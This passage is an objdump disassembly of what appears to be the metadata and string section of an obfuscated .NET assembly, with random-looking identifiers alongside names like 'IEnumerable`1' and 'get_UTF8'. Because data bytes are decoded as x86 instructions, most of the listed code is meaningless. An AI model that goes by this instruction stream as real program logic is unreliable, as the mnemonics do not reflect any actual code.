100025f9:	07                   	pop    %es
100025fa:	a2 06 06 00 2e       	mov    %al,0x2e000606
100025ff:	06                   	push   %es
10002600:	a2 06 06 00 e2       	mov    %al,0xe2000606
10002605:	03 e6                	add    %esi,%esp
10002607:	05 06 00 60 08       	add    $0x8600006,%eax
1000260c:	74 02                	je     0x10002610
1000260e:	06                   	push   %es
1000260f:	00 de                	add    %bl,%dh
10002611:	06                   	push   %es
10002612:	74 02                	je     0x10002616
10002614:	06                   	push   %es
10002615:	00 a5 00 a2 06 0e    	add    %ah,0xe06a200(%ebp)
1000261b:	00 17                	add    %dl,(%edi)
1000261d:	04 22                	add    $0x22,%al
1000261f:	07                   	pop    %es
10002620:	06                   	push   %es
10002621:	00 78 00             	add    %bh,0x0(%eax)
10002624:	9a 03 06 00 a9 06 a2 	lcall  $0xa206,$0xa9000603
1000262b:	06                   	push   %es
1000262c:	06                   	push   %es
1000262d:	00 35 06 74 02 00    	add    %dh,0x27406
10002633:	00 00                	add    %al,(%eax)
10002635:	00 68 01             	add    %ch,0x1(%eax)
10002638:	00 00                	add    %al,(%eax)
1000263a:	00 00                	add    %al,(%eax)
1000263c:	01 00                	add    %eax,(%eax)
1000263e:	01 00                	add    %eax,(%eax)
10002640:	81 01 10 00 dd 01    	addl   $0x1dd0010,(%ecx)
10002646:	dd 01                	fldl   (%ecx)
10002648:	41                   	inc    %ecx
10002649:	00 01                	add    %al,(%ecx)
1000264b:	00 01                	add    %al,(%ecx)
1000264d:	00 0b                	add    %cl,(%ebx)
1000264f:	01 10                	add    %edx,(%eax)
10002651:	00 54 02 00          	add    %dl,0x0(%edx,%eax,1)
10002655:	00 51 00             	add    %dl,0x0(%ecx)
10002658:	01 00                	add    %eax,(%eax)
1000265a:	09 00                	or     %eax,(%eax)
1000265c:	0b 01                	or     (%ecx),%eax
1000265e:	10 00                	adc    %al,(%eax)
10002660:	68 02 00 00 51       	push   $0x51000002
10002665:	00 05 00 09 00 03    	add    %al,0x3000900
1000266b:	01 10                	add    %edx,(%eax)
1000266d:	00 01                	add    %al,(%ecx)
1000266f:	00 00                	add    %al,(%eax)
10002671:	00 41 00             	add    %al,0x0(%ecx)
10002674:	17                   	pop    %ss
10002675:	00 09                	add    %cl,(%ecx)
10002677:	00 06                	add    %al,(%esi)
10002679:	00 10                	add    %dl,(%eax)
1000267b:	07                   	pop    %es
1000267c:	33 00                	xor    (%eax),%eax
1000267e:	06                   	push   %es
1000267f:	00 76 08             	add    %dh,0x8(%esi)
10002682:	33 00                	xor    (%eax),%eax
10002684:	06                   	push   %es
10002685:	00 0f                	add    %cl,(%edi)
10002687:	01 cf                	add    %ecx,%edi
10002689:	00 06                	add    %al,(%esi)
1000268b:	00 c7                	add    %al,%bh
1000268d:	01 cf                	add    %ecx,%edi
1000268f:	00 06                	add    %al,(%esi)
10002691:	00 7e 03             	add    %bh,0x3(%esi)
10002694:	cf                   	iret
10002695:	00 06                	add    %al,(%esi)
10002697:	00 c3                	add    %al,%bl
10002699:	00 d2                	add    %dl,%dl
1000269b:	00 06                	add    %al,(%esi)
1000269d:	00 45 00             	add    %al,0x0(%ebp)
100026a0:	d2 00                	rolb   %cl,(%eax)
100026a2:	06                   	push   %es
100026a3:	00 ac 00 d2 00 06 00 	add    %ch,0x600d2(%eax,%eax,1)
100026aa:	39 03                	cmp    %eax,(%ebx)
100026ac:	d5 00                	aad    $0x0
100026ae:	06                   	push   %es
100026af:	00 4d 03             	add    %cl,0x3(%ebp)
100026b2:	d5 00                	aad    $0x0
100026b4:	06                   	push   %es
100026b5:	00 e2                	add    %ah,%dl
100026b7:	02 d5                	add    %ch,%dl
100026b9:	00 06                	add    %al,(%esi)
100026bb:	00 7e 02             	add    %bh,0x2(%esi)
100026be:	d5 00                	aad    $0x0
100026c0:	06                   	push   %es
100026c1:	00 3d 03 d5 00 06    	add    %bh,0x600d503
100026c7:	00 3e                	add    %bh,(%esi)
100026c9:	01 d5                	add    %edx,%ebp
100026cb:	00 06                	add    %al,(%esi)
100026cd:	00 d1                	add    %dl,%cl
100026cf:	02 d5                	add    %ch,%dl
100026d1:	00 06                	add    %al,(%esi)
100026d3:	00 11                	add    %dl,(%ecx)
100026d5:	03 d5                	add    %ebp,%edx
100026d7:	00 06                	add    %al,(%esi)
100026d9:	00 fa                	add    %bh,%dl
100026db:	02 d8                	add    %al,%bl
100026dd:	00 06                	add    %al,(%esi)
100026df:	00 fe                	add    %bh,%dh
100026e1:	00 d8                	add    %bl,%al
100026e3:	00 06                	add    %al,(%esi)
100026e5:	00 29                	add    %ch,(%ecx)
100026e7:	01 33                	add    %esi,(%ebx)
100026e9:	00 06                	add    %al,(%esi)
100026eb:	00 26                	add    %ah,(%esi)
100026ed:	02 33                	add    (%ebx),%dh
100026ef:	00 06                	add    %al,(%esi)
100026f1:	00 2e                	add    %ch,(%esi)
100026f3:	07                   	pop    %es
100026f4:	33 00                	xor    (%eax),%eax
100026f6:	06                   	push   %es
100026f7:	00 ef                	add    %ch,%bh
100026f9:	00 33                	add    %dh,(%ebx)
100026fb:	00 06                	add    %al,(%esi)
100026fd:	00 58 01             	add    %bl,0x1(%eax)
10002700:	db 00                	fildl  (%eax)
10002702:	00 00                	add    %al,(%eax)
10002704:	00 00                	add    %al,(%eax)
10002706:	80 00 91             	addb   $0x91,(%eax)
10002709:	20 c4                	and    %al,%ah
1000270b:	03 e2                	add    %edx,%esp
1000270d:	00 01                	add    %al,(%ecx)
1000270f:	00 00                	add    %al,(%eax)
10002711:	00 00                	add    %al,(%eax)
10002713:	00 80 00 91 20 22    	add    %al,0x22209100(%eax)
10002719:	04 e9                	add    $0xe9,%al
1000271b:	00 03                	add    %al,(%ebx)
1000271d:	00 00                	add    %al,(%eax)
1000271f:	00 00                	add    %al,(%eax)
10002721:	00 80 00 91 20 36    	add    %al,0x36209100(%eax)
10002727:	08 ee                	or     %ch,%dh
10002729:	00 04 00             	add    %al,(%eax,%eax,1)
1000272c:	50                   	push   %eax
1000272d:	20 00                	and    %al,(%eax)
1000272f:	00 00                	add    %al,(%eax)
10002731:	00 96 00 12 08 f7    	add    %dl,-0x8f7ee00(%esi)
10002737:	00 09                	add    %cl,(%ecx)
10002739:	00 00                	add    %al,(%eax)
1000273b:	00 00                	add    %al,(%eax)
1000273d:	00 80 00 91 20 d5    	add    %al,-0x2adf6f00(%eax)
10002743:	07                   	pop    %es
10002744:	fe 00                	incb   (%eax)
10002746:	0b 00                	or     (%eax),%eax
10002748:	00 00                	add    %al,(%eax)
1000274a:	00 00                	add    %al,(%eax)
1000274c:	80 00 91             	addb   $0x91,(%eax)
1000274f:	20 d6                	and    %dl,%dh
10002751:	03 10                	add    (%eax),%edx
10002753:	01 15 00 00 00 00    	add    %edx,0x0
10002759:	00 80 00 91 20 4d    	add    %al,0x4d209100(%eax)
1000275f:	08 1c 01             	or     %bl,(%ecx,%eax,1)
10002762:	1c 00                	sbb    $0x0,%al
10002764:	0c 22                	or     $0x22,%al
10002766:	00 00                	add    %al,(%eax)
10002768:	00 00                	add    %al,(%eax)
1000276a:	93                   	xchg   %eax,%ebx
1000276b:	00 16                	add    %dl,(%esi)
1000276d:	00 27                	add    %ah,(%edi)
1000276f:	01 21                	add    %esp,(%ecx)
10002771:	00 7a 24             	add    %bh,0x24(%edx)
10002774:	00 00                	add    %al,(%eax)
10002776:	00 00                	add    %al,(%eax)
10002778:	86 18                	xchg   %bl,(%eax)
1000277a:	3e 07                	ds pop %es
1000277c:	06                   	push   %es
1000277d:	00 21                	add    %ah,(%ecx)
1000277f:	00 82 24 00 00 00    	add    %al,0x24(%edx)
10002785:	00 83 00 5f 00 2b    	add    %al,0x2b005f00(%ebx)
1000278b:	01 21                	add    %esp,(%ecx)
1000278d:	00 00                	add    %al,(%eax)
1000278f:	00 01                	add    %al,(%ecx)
10002791:	00 76 08             	add    %dh,0x8(%esi)
10002794:	02 00                	add    (%eax),%al
10002796:	02 00                	add    (%eax),%al
10002798:	b7 02                	mov    $0x2,%bh
1000279a:	00 00                	add    %al,(%eax)
1000279c:	01 00                	add    %eax,(%eax)
1000279e:	f5                   	cmc
1000279f:	06                   	push   %es
100027a0:	00 00                	add    %al,(%eax)
100027a2:	01 00                	add    %eax,(%eax)
100027a4:	10 07                	adc    %al,(%edi)
100027a6:	00 00                	add    %al,(%eax)
100027a8:	02 00                	add    (%eax),%al
100027aa:	81 03 00 00 03 00    	addl   $0x30000,(%ebx)
100027b0:	e3 07                	jecxz  0x100027b9
100027b2:	00 00                	add    %al,(%eax)
100027b4:	04 00                	add    $0x0,%al
100027b6:	8d 00                	lea    (%eax),%eax
100027b8:	00 00                	add    %al,(%eax)
100027ba:	05 00 51 03 00       	add    $0x35100,%eax
100027bf:	00 01                	add    %al,(%ecx)
100027c1:	00 3a                	add    %bh,(%edx)
100027c3:	06                   	push   %es
100027c4:	00 00                	add    %al,(%eax)
100027c6:	02 00                	add    (%eax),%al
100027c8:	ac                   	lods   %ds:(%esi),%al
100027c9:	07                   	pop    %es
100027ca:	00 00                	add    %al,(%eax)
100027cc:	01 00                	add    %eax,(%eax)
100027ce:	d5 00                	aad    $0x0
100027d0:	00 00                	add    %al,(%eax)
100027d2:	02 00                	add    (%eax),%al
100027d4:	21 03                	and    %eax,(%ebx)
100027d6:	00 00                	add    %al,(%eax)
100027d8:	03 00                	add    (%eax),%eax
100027da:	8f 02                	pop    (%edx)
100027dc:	00 00                	add    %al,(%eax)
100027de:	04 00                	add    $0x0,%al
100027e0:	3f                   	aas
100027e1:	02 00                	add    (%eax),%al
100027e3:	00 05 00 a0 01 00    	add    %al,0x1a000
100027e9:	00 06                	add    %al,(%esi)
100027eb:	00 71 01             	add    %dh,0x1(%ecx)
100027ee:	00 00                	add    %al,(%eax)
100027f0:	07                   	pop    %es
100027f1:	00 67 03             	add    %ah,0x3(%edi)
100027f4:	00 00                	add    %al,(%eax)
100027f6:	08 00                	or     %al,(%eax)
100027f8:	cf                   	iret
100027f9:	05 00 00 09 00       	add    $0x90000,%eax
100027fe:	ec                   	in     (%dx),%al
100027ff:	01 02                	add    %eax,(%edx)
10002801:	00 0a                	add    %cl,(%edx)
10002803:	00 01                	add    %al,(%ecx)
10002805:	02 00                	add    (%eax),%al
10002807:	00 01                	add    %al,(%ecx)
10002809:	00 10                	add    %dl,(%eax)
1000280b:	07                   	pop    %es
1000280c:	00 00                	add    %al,(%eax)
1000280e:	02 00                	add    (%eax),%al
10002810:	3f                   	aas
10002811:	02 00                	add    (%eax),%al
10002813:	00 03                	add    %al,(%ebx)
10002815:	00 53 06             	add    %dl,0x6(%ebx)
10002818:	00 00                	add    %al,(%eax)
1000281a:	04 00                	add    $0x0,%al
1000281c:	fb                   	sti
1000281d:	03 00                	add    (%eax),%eax
1000281f:	00 05 00 6b 06 00    	add    %al,0x66b00
10002825:	00 06                	add    %al,(%esi)
10002827:	00 71 01             	add    %dh,0x1(%ecx)
1000282a:	02 00                	add    (%eax),%al
1000282c:	07                   	pop    %es
1000282d:	00 b4 01 00 00 01 00 	add    %dh,0x10000(%ecx,%eax,1)
10002834:	10 07                	adc    %al,(%edi)
10002836:	00 00                	add    %al,(%eax)
10002838:	02 00                	add    (%eax),%al
1000283a:	25 08 00 00 03       	and    $0x3000008,%eax
1000283f:	00 9e 02 00 00 04    	add    %bl,0x4000002(%esi)
10002845:	00 15 02 02 00 05    	add    %dl,0x5000202
1000284b:	00 86 01 00 00 01    	add    %al,0x1000001(%esi)
10002851:	00 2e                	add    %ch,(%esi)
10002853:	04 09                	add    $0x9,%al
10002855:	00 3e                	add    %bh,(%esi)
10002857:	07                   	pop    %es
10002858:	01 00                	add    %eax,(%eax)
1000285a:	11 00                	adc    %eax,(%eax)
1000285c:	3e 07                	ds pop %es
1000285e:	06                   	push   %es
1000285f:	00 19                	add    %bl,(%ecx)
10002861:	00 3e                	add    %bh,(%esi)
10002863:	07                   	pop    %es
10002864:	0a 00                	or     (%eax),%al
10002866:	29 00                	sub    %eax,(%eax)
10002868:	3e 07                	ds pop %es
1000286a:	10 00                	adc    %al,(%eax)
1000286c:	31 00                	xor    %eax,(%eax)
1000286e:	3e 07                	ds pop %es
10002870:	10 00                	adc    %al,(%eax)
10002872:	39 00                	cmp    %eax,(%eax)
10002874:	3e 07                	ds pop %es
10002876:	10 00                	adc    %al,(%eax)
10002878:	41                   	inc    %ecx
10002879:	00 3e                	add    %bh,(%esi)
1000287b:	07                   	pop    %es
1000287c:	10 00                	adc    %al,(%eax)
1000287e:	49                   	dec    %ecx
1000287f:	00 3e                	add    %bh,(%esi)
10002881:	07                   	pop    %es
10002882:	10 00                	adc    %al,(%eax)
10002884:	51                   	push   %ecx
10002885:	00 3e                	add    %bh,(%esi)
10002887:	07                   	pop    %es
10002888:	10 00                	adc    %al,(%eax)
1000288a:	59                   	pop    %ecx
1000288b:	00 3e                	add    %bh,(%esi)
1000288d:	07                   	pop    %es
1000288e:	10 00                	adc    %al,(%eax)
10002890:	61                   	popa
10002891:	00 3e                	add    %bh,(%esi)
10002893:	07                   	pop    %es
10002894:	15 00 69 00 3e       	adc    $0x3e006900,%eax
10002899:	07                   	pop    %es
1000289a:	10 00                	adc    %al,(%eax)
1000289c:	71 00                	jno    0x1000289e
1000289e:	3e 07                	ds pop %es
100028a0:	10 00                	adc    %al,(%eax)
100028a2:	79 00                	jns    0x100028a4
100028a4:	3e 07                	ds pop %es
100028a6:	10 00                	adc    %al,(%eax)
100028a8:	99                   	cltd
100028a9:	00 3e                	add    %bh,(%esi)
100028ab:	07                   	pop    %es
100028ac:	06                   	push   %es
100028ad:	00 b1 00 df 05 27    	add    %dh,0x2705df00(%ecx)
100028b3:	00 b9 00 05 07 33    	add    %bh,0x33070500(%ecx)
100028b9:	00 b9 00 6a 08 36    	add    %bh,0x36086a00(%ecx)
100028bf:	00 c1                	add    %al,%cl
100028c1:	00 20                	add    %ah,(%eax)
100028c3:	01 3c 00             	add    %edi,(%eax,%eax,1)
100028c6:	c9                   	leave
100028c7:	00 1a                	add    %bl,(%edx)
100028c9:	06                   	push   %es
100028ca:	41                   	inc    %ecx
100028cb:	00 c1                	add    %al,%cl
100028cd:	00 2b                	add    %ch,(%ebx)
100028cf:	06                   	push   %es
100028d0:	47                   	inc    %edi
100028d1:	00 d1                	add    %dl,%cl
100028d3:	00 0f                	add    %cl,(%edi)
100028d5:	04 4d                	add    $0x4d,%al
100028d7:	00 91 00 3e 07 10    	add    %dl,0x10073e00(%ecx)
100028dd:	00 d9                	add    %bl,%cl
100028df:	00 0a                	add    %cl,(%edx)
100028e1:	07                   	pop    %es
100028e2:	53                   	push   %ebx
100028e3:	00 89 00 b5 03 58    	add    %cl,0x5803b500(%ecx)
100028e9:	00 89 00 ed 03 5e    	add    %cl,0x5e03ed00(%ecx)
100028ef:	00 89 00 9d 06 06    	add    %cl,0x6069d00(%ecx)
100028f5:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028f8:	3e 07                	ds pop %es
100028fa:	06                   	push   %es
100028fb:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028fe:	e9 03 6f 00 e1       	jmp    0xf1009806
10002903:	00 c3                	add    %al,%bl
10002905:	07                   	pop    %es
10002906:	75 00                	jne    0x10002908
10002908:	14 00                	adc    $0x0,%al
1000290a:	3e 07                	ds pop %es
1000290c:	85 00                	test   %eax,(%eax)
1000290e:	f9                   	stc
1000290f:	00 3d 04 8b 00 f9    	add    %bh,0xf9008b04
10002915:	00 45 08             	add    %al,0x8(%ebp)
10002918:	a8 00                	test   $0x0,%al
1000291a:	09 01                	or     %eax,(%ecx)
1000291c:	3e 07                	ds pop %es
1000291e:	06                   	push   %es
1000291f:	00 09                	add    %cl,(%ecx)
10002921:	01 01                	add    %eax,(%ecx)
10002923:	08 b6 00 81 00 3e    	or     %dh,0x3e008100(%esi)
10002929:	07                   	pop    %es
1000292a:	06                   	push   %es
1000292b:	00 11                	add    %dl,(%ecx)
1000292d:	01 b0 06 bb 00 0c    	add    %esi,0xc00bb06(%eax)
10002933:	00 cc                	add    %cl,%ah
10002935:	07                   	pop    %es
10002936:	c0 00 2e             	rolb   $0x2e,(%eax)
10002939:	00 0b                	add    %cl,(%ebx)
1000293b:	00 30                	add    %dh,(%eax)
1000293d:	01 2e                	add    %ebp,(%esi)
1000293f:	00 13                	add    %dl,(%ebx)
10002941:	00 39                	add    %bh,(%ecx)
10002943:	01 2e                	add    %ebp,(%esi)
10002945:	00 1b                	add    %bl,(%ebx)
10002947:	00 58 01             	add    %bl,0x1(%eax)
1000294a:	2e 00 23             	add    %ah,%cs:(%ebx)
1000294d:	00 61 01             	add    %ah,0x1(%ecx)
10002950:	2e 00 2b             	add    %ch,%cs:(%ebx)
10002953:	00 75 01             	add    %dh,0x1(%ebp)
10002956:	2e 00 33             	add    %dh,%cs:(%ebx)
10002959:	00 75 01             	add    %dh,0x1(%ebp)
1000295c:	2e 00 3b             	add    %bh,%cs:(%ebx)
1000295f:	00 75 01             	add    %dh,0x1(%ebp)
10002962:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
10002966:	61                   	popa
10002967:	01 2e                	add    %ebp,(%esi)
10002969:	00 4b 00             	add    %cl,0x0(%ebx)
1000296c:	7b 01                	jnp    0x1000296f
1000296e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
10002972:	75 01                	jne    0x10002975
10002974:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
10002978:	75 01                	jne    0x1000297b
1000297a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
1000297e:	93                   	xchg   %eax,%ebx
1000297f:	01 2e                	add    %ebp,(%esi)
10002981:	00 6b 00             	add    %ch,0x0(%ebx)
10002984:	bd 01 2e 00 73       	mov    $0x73002e01,%ebp
10002989:	00 ca                	add    %cl,%dl
1000298b:	01 a3 00 7b 00 14    	add    %esp,0x14007b00(%ebx)
10002991:	02 00                	add    (%eax),%al
10002993:	01 7b 00             	add    %edi,0x0(%ebx)
10002996:	14 02                	adc    $0x2,%al
10002998:	1a 00                	sbb    (%eax),%al
1000299a:	62 00                	bound  %eax,(%eax)
1000299c:	7d 06                	jge    0x100029a4
1000299e:	69 00 7e 00 40 01    	imul   $0x140007e,(%eax),%eax
100029a4:	03 00                	add    (%eax),%eax
100029a6:	c4 03                	les    (%ebx),%eax
100029a8:	01 00                	add    %eax,(%eax)
100029aa:	00 01                	add    %al,(%ecx)
100029ac:	05 00 22 04 01       	add    $0x1042200,%eax
100029b1:	00 40 01             	add    %al,0x1(%eax)
100029b4:	07                   	pop    %es
100029b5:	00 36                	add    %dh,(%esi)
100029b7:	08 01                	or     %al,(%ecx)
100029b9:	00 40 01             	add    %al,0x1(%eax)
100029bc:	0b 00                	or     (%eax),%eax
100029be:	d5 07                	aad    $0x7
100029c0:	01 00                	add    %eax,(%eax)
100029c2:	40                   	inc    %eax
100029c3:	01 0d 00 d6 03 01    	add    %ecx,0x103d600
100029c9:	00 40 01             	add    %al,0x1(%eax)
100029cc:	0f 00 4d 08          	str    0x8(%ebp)
100029d0:	01 00                	add    %eax,(%eax)
100029d2:	04 80                	add    $0x80,%al
100029d4:	00 00                	add    %al,(%eax)
100029d6:	01 00                	add    %eax,(%eax)
	...
100029e4:	dd 01                	fldl   (%ecx)
100029e6:	00 00                	add    %al,(%eax)
100029e8:	04 00                	add    $0x0,%al
	...
100029f2:	00 00                	add    %al,(%eax)
100029f4:	c6 00 91             	movb   $0x91,(%eax)
100029f7:	03 00                	add    (%eax),%eax
100029f9:	00 00                	add    %al,(%eax)
100029fb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002a06:	00 00                	add    %al,(%eax)
10002a08:	c6 00 a2             	movb   $0xa2,(%eax)
10002a0b:	06                   	push   %es
10002a0c:	00 00                	add    %al,(%eax)
10002a0e:	00 00                	add    %al,(%eax)
10002a10:	04 00                	add    $0x0,%al
	...
10002a1a:	00 00                	add    %al,(%eax)
10002a1c:	c6 00 43             	movb   $0x43,(%eax)
10002a1f:	04 00                	add    $0x0,%al
10002a21:	00 00                	add    %al,(%eax)
10002a23:	00 03                	add    %al,(%ebx)
10002a25:	00 02                	add    %al,(%edx)
10002a27:	00 04 00             	add    %al,(%eax,%eax,1)
10002a2a:	02 00                	add    (%eax),%al
10002a2c:	05 00 02 00 21       	add    $0x21000200,%eax
10002a31:	00 2e                	add    %ch,(%esi)
10002a33:	00 41 00             	add    %al,0x0(%ecx)
10002a36:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a37:	00 43 00             	add    %al,0x0(%ebx)
10002a3a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a3b:	00 00                	add    %al,(%eax)
10002a3d:	00 00                	add    %al,(%eax)
10002a3f:	00 00                	add    %al,(%eax)
10002a41:	3c 3e                	cmp    $0x3e,%al
10002a43:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002a46:	44                   	inc    %esp
10002a47:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002a4e:	6c                   	insb   (%dx),%es:(%edi)
10002a4f:	61                   	popa
10002a50:	73 73                	jae    0x10002ac5
10002a52:	33 5f 30             	xor    0x30(%edi),%ebx
10002a55:	00 3c 53             	add    %bh,(%ebx,%edx,2)
10002a58:	4d                   	dec    %ebp
10002a59:	4e                   	dec    %esi
10002a5a:	75 4e                	jne    0x10002aaa
10002a5c:	4b                   	dec    %ebx
10002a5d:	72 5a                	jb     0x10002ab9
10002a5f:	41                   	inc    %ecx
10002a60:	62 66 6a             	bound  %esp,0x6a(%esi)
10002a63:	50                   	push   %eax
10002a64:	73 63                	jae    0x10002ac9
10002a66:	55                   	push   %ebp
10002a67:	72 77                	jb     0x10002ae0
10002a69:	3e 67 5f             	ds addr16 pop %edi
10002a6c:	5f                   	pop    %edi
10002a6d:	4e                   	dec    %esi
10002a6e:	53                   	push   %ebx
10002a6f:	4f                   	dec    %edi
10002a70:	4c                   	dec    %esp
10002a71:	71 65                	jno    0x10002ad8
10002a73:	49                   	dec    %ecx
10002a74:	59                   	pop    %ecx
10002a75:	44                   	inc    %esp
10002a76:	4d                   	dec    %ebp
10002a77:	71 79                	jno    0x10002af2
10002a79:	6f                   	outsl  %ds:(%esi),(%dx)
10002a7a:	30 50 33             	xor    %dl,0x33(%eax)
10002a7d:	31 4f 41             	xor    %ecx,0x41(%edi)
10002a80:	7c 33                	jl     0x10002ab5
10002a82:	5f                   	pop    %edi
10002a83:	30 00                	xor    %al,(%eax)
10002a85:	50                   	push   %eax
10002a86:	7a 65                	jp     0x10002aed
10002a88:	78 56                	js     0x10002ae0
10002a8a:	56                   	push   %esi
10002a8b:	51                   	push   %ecx
10002a8c:	62 52 38             	bound  %edx,0x38(%edx)
10002a8f:	63 6a 4e             	arpl   %ebp,0x4e(%edx)
10002a92:	6f                   	outsl  %ds:(%esi),(%dx)
10002a93:	74 38                	je     0x10002acd
10002a95:	39 6f 33             	cmp    %ebp,0x33(%edi)
10002a98:	51                   	push   %ecx
10002a99:	4b                   	dec    %ebx
10002a9a:	66 71 45             	data16 jno 0x10002ae2
10002a9d:	31 00                	xor    %eax,(%eax)
10002a9f:	3c 53                	cmp    $0x53,%al
10002aa1:	4d                   	dec    %ebp
10002aa2:	4e                   	dec    %esi
10002aa3:	75 4e                	jne    0x10002af3
10002aa5:	4b                   	dec    %ebx
10002aa6:	72 5a                	jb     0x10002b02
10002aa8:	41                   	inc    %ecx
10002aa9:	62 66 6a             	bound  %esp,0x6a(%esi)
10002aac:	50                   	push   %eax
10002aad:	73 63                	jae    0x10002b12
10002aaf:	55                   	push   %ebp
10002ab0:	72 77                	jb     0x10002b29
10002ab2:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002ab6:	31 00                	xor    %eax,(%eax)
10002ab8:	49                   	dec    %ecx
10002ab9:	45                   	inc    %ebp
10002aba:	6e                   	outsb  %ds:(%esi),(%dx)
10002abb:	75 6d                	jne    0x10002b2a
10002abd:	65 72 61             	gs jb  0x10002b21
10002ac0:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002ac4:	31 00                	xor    %eax,(%eax)
10002ac6:	4c                   	dec    %esp
10002ac7:	69 73 74 60 31 00 57 	imul   $0x57003160,0x74(%ebx),%esi
10002ace:	57                   	push   %edi
10002acf:	54                   	push   %esp
10002ad0:	6f                   	outsl  %ds:(%esi),(%dx)
10002ad1:	43                   	inc    %ebx
10002ad2:	70 4f                	jo     0x10002b23
10002ad4:	70 77                	jo     0x10002b4d
10002ad6:	78 41                	js     0x10002b19
10002ad8:	6f                   	outsl  %ds:(%esi),(%dx)
10002ad9:	77 46                	ja     0x10002b21
10002adb:	36 6c                	ss insb (%dx),%es:(%edi)
10002add:	72 54                	jb     0x10002b33
10002adf:	74 49                	je     0x10002b2a
10002ae1:	4b                   	dec    %ebx
10002ae2:	73 31                	jae    0x10002b15
10002ae4:	00 46 75             	add    %al,0x75(%esi)
10002ae7:	6e                   	outsb  %ds:(%esi),(%dx)
10002ae8:	63 60 32             	arpl   %esp,0x32(%eax)
10002aeb:	00 5a 69             	add    %bl,0x69(%edx)
10002aee:	59                   	pop    %ecx
10002aef:	77 45                	ja     0x10002b36
10002af1:	41                   	inc    %ecx
10002af2:	61                   	popa
10002af3:	64 75 36             	fs jne 0x10002b2c
10002af6:	44                   	inc    %esp
10002af7:	59                   	pop    %ecx
10002af8:	4d                   	dec    %ebp
10002af9:	6b 59 4b 4a          	imul   $0x4a,0x4b(%ecx),%ebx
10002afd:	43                   	inc    %ebx
10002afe:	33 67 61             	xor    0x61(%edi),%esp
10002b01:	32 00                	xor    (%eax),%al
10002b03:	41                   	inc    %ecx
10002b04:	43                   	inc    %ebx
10002b05:	62 71 5a             	bound  %esi,0x5a(%ecx)
10002b08:	76 54                	jbe    0x10002b5e
10002b0a:	43                   	inc    %ebx
10002b0b:	66 52                	push   %dx
10002b0d:	4c                   	dec    %esp
10002b0e:	39 65 37             	cmp    %esp,0x37(%ebp)
10002b11:	4f                   	dec    %edi
10002b12:	55                   	push   %ebp
10002b13:	33 00                	xor    (%eax),%eax
10002b15:	47                   	inc    %edi
10002b16:	50                   	push   %eax
10002b17:	56                   	push   %esi
10002b18:	41                   	inc    %ecx
10002b19:	61                   	popa
10002b1a:	4d                   	dec    %ebp
10002b1b:	58                   	pop    %eax
10002b1c:	6c                   	insb   (%dx),%es:(%edi)
10002b1d:	47                   	inc    %edi
10002b1e:	4b                   	dec    %ebx
10002b1f:	4b                   	dec    %ebx
10002b20:	6d                   	insl   (%dx),%es:(%edi)
10002b21:	73 35                	jae    0x10002b58
10002b23:	68 71 6d 78 43       	push   $0x43786d71
10002b28:	58                   	pop    %eax
10002b29:	48                   	dec    %eax
10002b2a:	44                   	inc    %esp
10002b2b:	6a 31                	push   $0x31
10002b2d:	35 00 4c 47 6d       	xor    $0x6d474c00,%eax
10002b32:	68 46 79 6a 33       	push   $0x336a7946
10002b37:	65 73 48             	gs jae 0x10002b82
10002b3a:	38 68 36             	cmp    %ch,0x36(%eax)
10002b3d:	00 52 4f             	add    %dl,0x4f(%edx)
10002b40:	6a 73                	push   $0x73
10002b42:	54                   	push   %esp
10002b43:	4f                   	dec    %edi
10002b44:	75 67                	jne    0x10002bad
10002b46:	4b                   	dec    %ebx
10002b47:	6a 43                	push   $0x43
10002b49:	45                   	inc    %ebp
10002b4a:	36 4c                	ss dec %esp
10002b4c:	78 36                	js     0x10002b84
10002b4e:	00 4b 62             	add    %cl,0x62(%ebx)
10002b51:	6f                   	outsl  %ds:(%esi),(%dx)
10002b52:	78 70                	js     0x10002bc4
10002b54:	55                   	push   %ebp
10002b55:	61                   	popa
10002b56:	59                   	pop    %ecx
10002b57:	53                   	push   %ebx
10002b58:	48                   	dec    %eax
10002b59:	68 58 4e 62 39       	push   $0x39624e58
10002b5e:	38 00                	cmp    %al,(%eax)
10002b60:	67 65 74 5f          	addr16 gs je 0x10002bc3
10002b64:	55                   	push   %ebp
10002b65:	54                   	push   %esp
10002b66:	46                   	inc    %esi
10002b67:	38 00                	cmp    %al,(%eax)
10002b69:	58                   	pop    %eax
10002b6a:	51                   	push   %ecx
10002b6b:	5a                   	pop    %edx
10002b6c:	58                   	pop    %eax
10002b6d:	76 51                	jbe    0x10002bc0
10002b6f:	62 7a 31             	bound  %edi,0x31(%edx)
10002b72:	61                   	popa
10002b73:	73 69                	jae    0x10002bde
10002b75:	34 6d                	xor    $0x6d,%al
10002b77:	77 7a                	ja     0x10002bf3
10002b79:	34 69                	xor    $0x69,%al
10002b7b:	55                   	push   %ebp
10002b7c:	38 00                	cmp    %al,(%eax)
10002b7e:	48                   	dec    %eax
10002b7f:	53                   	push   %ebx
10002b80:	72 4e                	jb     0x10002bd0
10002b82:	72 71                	jb     0x10002bf5
10002b84:	48                   	dec    %eax
10002b85:	65 39 4a 78          	cmp    %ecx,%gs:0x78(%edx)
10002b89:	39 69 35             	cmp    %ebp,0x35(%ecx)
10002b8c:	50                   	push   %eax
10002b8d:	59                   	pop    %ecx
10002b8e:	6b 61 33 6b          	imul   $0x6b,0x33(%ecx),%esp
10002b92:	30 4f 73             	xor    %cl,0x73(%edi)
10002b95:	75 38                	jne    0x10002bcf
10002b97:	00 48 62             	add    %cl,0x62(%eax)
10002b9a:	7a 75                	jp     0x10002c11
10002b9c:	79 71                	jns    0x10002c0f
10002b9e:	4b                   	dec    %ebx
10002b9f:	57                   	push   %edi
10002ba0:	36 6e                	outsb  %ss:(%esi),(%dx)
10002ba2:	77 4a                	ja     0x10002bee
10002ba4:	65 6a 39             	gs push $0x39
10002ba7:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
